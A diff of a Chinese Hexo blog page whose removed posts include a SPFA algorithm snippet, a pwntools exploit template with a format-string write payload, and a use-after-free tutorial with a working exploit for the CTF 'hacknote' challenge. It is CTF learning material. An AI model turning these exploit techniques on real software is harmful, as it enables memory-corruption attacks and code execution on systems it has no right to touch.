原理：如果某条最短路径上有n个点（除了自己），那么加上自己之后一共有n+1个点，由抽屉原理一定有两个点相同，所以存在环。</span></span><br><span class="line"></span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(i);</span><br><span class="line">    st[i] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (q.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">    q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">st[t] = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (dist[j] &gt; dist[t] + w[i])</span><br><span class="line">        &#123;</span><br><span class="line">            dist[j] = dist[t] + w[i];</span><br><span class="line">            cnt[j] = cnt[t] + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (cnt[j] &gt;= n) <span class="keyword">return</span> <span class="literal">true</span>;       <span class="comment">// 如果从1号点到x的最短路中包含至少n个点（不包括自己），则说明存在环</span></span><br><span class="line">            <span class="keyword">if</span> (!st[j])</span><br><span class="line">            &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(j);</span><br><span class="line">                st[j] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/18/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E5%A4%A7%E5%85%A8/" data-id="clsqw0kjk00050k4fg609arb8" data-title="算法模板大全" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-EXP模板" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/" class="article-date">
-  <time class="dt-published" datetime="2023-07-27T13:27:09.000Z" itemprop="datePublished">2023-07-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/">EXP模板</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>​	</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">c = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(c):</span><br><span class="line">        gdb.attach(p, c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">r   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./easystack&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.anna.nssctf.cn&#x27;, 28976)</span></span><br><span class="line"><span class="comment">#elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *0x4014d2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;input: &#x27;</span>, <span class="string">b&#x27;%4660c%7$n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/" data-id="clsqw0kf300000k4fgxxigg4h" data-title="EXP模板" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-UAF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/07/24/UAF/" class="article-date">
-  <time class="dt-published" datetime="2023-07-24T13:48:34.000Z" itemprop="datePublished">2023-07-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/07/24/UAF/">UAF</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">相关博文</a></li>
-<li><a target="_blank" rel="noopener" href="https://zhangyan8216.github.io/">个人博客首页</a></li>
-<li>注：学习交流使用！</li>
-</ul>
-<hr>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
-<ul>
-<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
-<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
-<li>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
-</ul>
-<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。</strong><br>举个例子</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *myname;</span><br><span class="line">  <span class="type">void</span> (*func)(<span class="type">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="type">void</span> <span class="title function_">myprint</span><span class="params">(<span class="type">char</span> *str)</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printmyname</span><span class="params">()</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行结果如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      </span><br><span class="line">this is my function</span><br><span class="line">I can also use it</span><br><span class="line">call print my name</span><br><span class="line">this pogram will crash...</span><br><span class="line">[1]    38738 segmentation fault (core dumped)  ./use_after_free</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="具体实例"><a href="#具体实例" class="headerlink" title="具体实例"></a>具体实例</h2><ul>
-<li><p>[题目地址]：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote</a></p>
-<h2 id="利用分析-："><a href="#利用分析-：" class="headerlink" title="利用分析 ："></a>利用分析 ：</h2><p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。 那么该怎么执行呢？</p>
-</li>
-</ul>
-<p>我们可以简单来看一下每一个 note 生成的具体流程</p>
-<p>程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。<br>程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。</p>
-<p>   +—————–+<br>   |   put           |<br>   +—————–+<br>   |   content       |       size<br>   +—————–+——————-&gt;+—————-+<br>                                          |     real       |<br>                                          |    content     |<br>                                          |                |<br>                                          +—————-+<br>那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p>
-<p>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）<br>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）<br>释放 note0<br>释放 note1<br>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0<br>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则<br>note2 其实会分配 note1 对应的内存块。<br>real content 对应的 chunk 其实是 note0。<br>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</p>
-<h2 id="exp脚本"><a href="#exp脚本" class="headerlink" title="exp脚本"></a>exp脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">-*- coding: utf-<span class="number">8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<hr>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">参考资料1</a></li>
-<li>[参考资料2](【XMCVE 2020 CTF Pwn入门课程】<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1854y1y7Ro?p=11&vd_source=5b65791e50610a90ef8469865c34baa1">https://www.bilibili.com/video/BV1854y1y7Ro?p=11&amp;vd_source=5b65791e50610a90ef8469865c34baa1</a>)</li>
-</ul>
-<hr>
-<h2 id="作者感慨"><a href="#作者感慨" class="headerlink" title="作者感慨"></a>作者感慨</h2><p>UAF是堆中的最简单的漏洞，是基础。</p>
-<p>但是它真的不简单，挺难的。</p>
-<p>但还是那句话张师傅出品，必属精品！！！</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/07/24/UAF/" data-id="clsqw0kfc00010k4f2mh32rbr" data-title="UAF" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/%E5%A0%86/" style="font-size: 10px;">堆</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 10px;">算法</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2024/02/18/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E5%A4%A7%E5%85%A8/">算法模板大全</a>
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
           </li>
+          
         
-          <li>
-            <a href="/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/">EXP模板</a>
-          </li>
         
-          <li>
-            <a href="/2023/07/24/UAF/">UAF</a>
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
           </li>
         
       </ul>
     </div>
   </div>
+</nav>
 
   
-</aside>
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="An elegant Material-Design theme for Hexo"></span>
+          
+        </div>
+
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
+
       
-      &copy; 2024 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
     </div>
   </div>
-</footer>
+</div>
 
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+</div>
+
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div id="board"
+          style="margin-top: 0">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/02/18/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E5%A4%A7%E5%85%A8/" target="_self">
+          算法模板大全
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/02/18/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E5%A4%A7%E5%85%A8/" target="_self">
+        <div>
+          一、基本数据结构1.并查集 （1）作用 将两个集合合并，询问两个数据是否在一个集合当中； （2）模版 &#x2F;&#x2F;朴素版模版 12345678910111213141516int find(int x)  &#123;       if(p[x]!=x) p[x]=find(p[x]);      return p[x];  &#125; //带权重边并查集 int find(int
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-02-18 00:00" pubdate>
+              2024-02-18
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E7%AE%97%E6%B3%95/">#算法</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/" target="_self">
+          EXP模板
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2023/07/27/EXP%E6%A8%A1%E6%9D%BF/" target="_self">
+        <div>
+          ​	 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from struct import packfrom ctypes import *import base64#from LibcSearcher import *def debug(c = 0)
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2023-07-27 21:27" pubdate>
+              2023-07-27
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2023/07/24/UAF/" target="_self">
+          UAF
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2023/07/24/UAF/" target="_self">
+        <div>
+          写在前面 相关博文 个人博客首页 注：学习交流使用！   正文原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况  内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2023-07-24 21:48" pubdate>
+              2023-07-24
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E5%A0%86/">#堆</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
     
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
